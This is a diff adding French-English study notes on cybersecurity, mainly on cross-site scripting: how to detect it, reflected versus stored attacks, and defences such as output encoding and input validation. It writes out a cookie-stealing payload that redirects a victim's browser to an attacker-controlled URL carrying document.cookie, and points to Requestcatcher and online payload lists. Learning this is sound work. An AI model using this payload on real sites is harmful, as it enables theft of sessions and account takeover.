@@ -1549,3 +1549,49 @@ Host pace
 - SHA256 (et SHA512, SHA1, ...) sont des fonctions de hashage.
 - **authorized_keys** : C'est le fichier, situé dans ``~/.ssh/`` d'un serveur, qui dit les clés publiques qui sont autorisées à se connecter à un certain user. 
   * Un client peut se connecter à un serveur en SSH au user ``utilisateur`` si (et seulement si) sa clé publique se situe dans le ``authorized_keys`` de l'utilisateur, autrement dit dans le fichier ``/home/utilisateur/.ssh/authorized_keys``. 
+
+## Cybersecurity
+
+### Metadatas
+
+- ``meta2go``, ``exiftool``, ``aperisolve``, ... Are tools that are able to extract metadatas.
+- ``www.dcode.fr`` propose un détecteur de code, qui tente de trouver le code qui a choffré un truc. 
+
+### Cross-site scripting (XSS)
+
+- XSS Means cross-site scripting. Yes, the acronym does not work...
+- The goal of a XSS breach is to get the cookies of an administrator of a web page. This is done by getting a cookie, which acts like an access token.
+- Example : When typing "Foobar" in a the Google seach engine, the word "Foobar" appears in the web page source code. More generally : if there is an input on the page that reads text, and if it turns out that this code gets written directly on the HTML, you can inject stuff on the HTML... JavaScript ``<script></script>`` tags for instance, that can run code !
+- Context is the crucial point : The text could be inserted as raw HTML code, inside HTML tags attribute, or inside JavaScript code.
+- To detect XSS : List all user inputs, and try to see them being reused (reflected, written directly) on the page 
+- To exploit an XSS breach : 
+  * You would, typically, insert the following JavaScript Code : ``document.location.replace(CONTROLLED_URL+document.cookie)``
+  * This code will, when executed in a browser, replace the cuurent URL the browser is into by the URL ``CONTROLLED_URL+document.cookie``.
+  * Here, ``CONTROLLED_URL`` is an URL you control, i.e. that you can choose.
+  * Typically, you would use a website like ``Pipedream`` or **``Requestcatcher``** (Requestcatcher is better) that gives you an URL (which you (partially) choose, like ``hiimsteve.requestcatcher.com`` and prints you the requests that are sent to that URL. 
+  * Adding ``document.cookie`` adds the cookies of the person that get trapped in the XSS breach !
+- Reflected XSS
+  * In this case, the malicious code is executed locally on the admin's machine.
+  * The attacker sends to the admin a webpage with a malicous payload. Typically, what we mean by payload is URL of the form ``www.website.com/.../[URL encoded payload]`` : that is, adding a payload means adding something to the URL. 
+  * The admin must then click on the link. This is basically fishing : the admin must click on the link...
+  * The admin will then visit (his own !) web page, connected with his account. His (own !) server will respond ot him (with his admin cookie).
+  * The malicious payload will then be executed (on his own machine), and will send his cookie to the attacker.
+- Stocked XSS
+  * In this case, the malicious code is stocked on the distant server. Hence, all users that will load the page will be victims of the attacker !!
+  * This is done by injecting code on the website ; this requires the website to allow this. Typically, this happens on a forum, on which people can post text ; or comments (like on YouTube), ...
+  * Any people visiting the website will then request the webpage. The malicious is executed on their machine, and send the informations (cookies...) to the attacher.
+- For payloads, code to be injected, there are many ressources online that list possible payloads and stuff :
+  * [Hacktricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
+  * [XSS Cheatsheets](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+  * Payloads on git
+    + https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt
+    + https://github.com/payloadbox/xss-payload-list 
+  * Searching a little bit often gets you what you need
+- Protection against XSS
+  * The most powerful one : Encoding data
+  * That is, replacing ``<`` by ``&lt;`` and ``>`` by ``&gt;``. This works well because data ecryption in HTML was done precisely to prevent XSS vulnerabilities.
+  * Filtering data : If a user writes ``<script>`` in a text form... He is likely fouting himself of your gueule : prevent them from writing stuff like this in text boxes
+  * Validation : A text box that is supposed to recieve a phone number should stop anyone from writing anything else than digits for instance ;
+  * CSP : complicated, we'll see that later
+- To put payload into URLs, you must use URL encoding : ``urlencoder.org``. This can also be used for URL decoding. More generally, to inject text into URLs, you must encode things into the right "URL format". Otherwise things dont work. 
+- The ``eval()`` function in JavaScript is very dangerous in terms of security. Avoid it (voire : banish it).
